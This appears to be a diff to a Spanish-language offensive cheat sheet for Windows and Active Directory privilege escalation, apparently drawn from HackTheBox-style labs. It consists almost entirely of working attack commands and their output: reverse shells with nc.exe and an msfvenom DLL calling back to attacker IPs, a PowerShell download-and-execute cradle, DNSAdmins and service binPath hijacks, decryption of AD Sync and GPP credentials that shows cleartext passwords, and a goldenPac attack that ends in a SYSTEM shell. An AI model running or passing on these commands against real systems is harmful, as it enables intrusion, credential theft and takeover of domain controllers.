@@ -14,6 +14,74 @@ iwr -uri http://10.10.14.2/nc.exe -o nc.exe
 .\SharpWSUS.exe create /payload:"C:\Windows\Temp\Privesc\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c C:\\Windows\Temp\Privesc\\nc.exe -e cmd 10.10.14.2 443" /title:"ReverseShell"
 ```
 
+## Abuso del grupo Azure Admins
+
+```null
+*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.16.9/AdDecrypt.exe -o AdDecrypt.exe
+*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.16.9/mcrypt.dll -o mcrypt.dll
+*Evil-WinRM* PS C:\> cd "C:\Program Files\Microsoft Azure AD Sync\bin"
+*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\bin> C:\Temp\AdDecrypt.exe -FullSQL
+
+======================
+AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
+Based on original code from: https://github.com/fox-it/adconnectdump
+======================
+
+Opening database connection...
+Executing SQL commands...
+Closing database connection...
+Decrypting XML...
+Parsing XML...
+Finished!
+
+DECRYPTED CREDENTIALS:
+Username: administrator
+Password: d0m@in4dminyeah!
+Domain: MEGABANK.LOCAL
+```
+
+## Abuso del grupo DNSAdmins
+
+### Creación de binario para la reverse shell
+
+```null
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=443 -f dll -o pwned.dll
+```
+
+### Inserción en un servicio
+
+```null
+*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd /config /serverlevelplugindll \\10.10.16.9\shared\pwned.dll
+```
+
+### Reiniciar servicio
+
+```null
+*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns
+*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns
+```
+
+## Abuso del grupo Server Operators
+
+### Modificación del BinPath de un servicio
+
+```null
+*Evil-WinRM* PS C:\Privesc> sc.exe config VMTools binPath="C:\Privesc\nc.exe -e cmd.exe 10.10.16.6 443"
+[SC] ChangeServiceConfig SUCCESS
+```
+
+### Reinicio del proceso
+
+```null
+*Evil-WinRM* PS C:\Privesc> sc.exe config browser binPath="C:\Windows\System32\cmd.exe /c net localgroup administrators jorden /add"
+[SC] ChangeServiceConfig SUCCESS
+
+*Evil-WinRM* PS C:\Privesc> sc.exe start browser
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+```
+
 ## Credenciales cacheadas
 
 ### Firefox
@@ -129,3 +197,46 @@ more < C:\Users\Administrator\Desktop\root.txt:flag.txt
 ```null
 impacket-secretsdump -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit LOCAL
 ```
+
+
+## Obtener procesos por Identificador
+
+```null
+PS C:\Windows\Temp> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/Get-WinEventData.ps1')
+```
+
+```null
+PS C:\Windows\Temp> Get-WinEvent -FilterHashtable @{Logname='security';id=4688} -MaxEvents 10 | Get-WinEventData
+```
+
+## Decrypt groups.xml
+
+```null
+gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
+MyUnclesAreMarioAndLuigi!!1!
+```
+
+## Golden Ticket Attack
+
+```null
+goldenPac.py 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
+[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
+[*] Attacking domain controller mantis.htb.local
+[*] mantis.htb.local found vulnerable!
+[*] Requesting shares on mantis.....
+[*] Found writable share ADMIN$
+[*] Uploading file xvCbwVPb.exe
+[*] Opening SVCManager on mantis.....
+[*] Creating service Jlxr on mantis.....
+[*] Starting service Jlxr.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
